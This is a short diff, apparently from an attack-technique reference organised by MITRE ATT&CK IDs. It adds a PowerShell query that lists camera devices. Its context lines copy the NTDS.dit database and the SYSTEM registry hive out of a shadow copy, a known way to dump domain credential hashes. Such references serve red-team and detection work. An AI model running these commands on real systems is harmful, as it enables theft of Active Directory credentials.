@@ -60,6 +60,9 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Wi
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
 reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
 
+
+Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"
+
 T1003.004.md
 T1003.005.md
 T1003.006.md
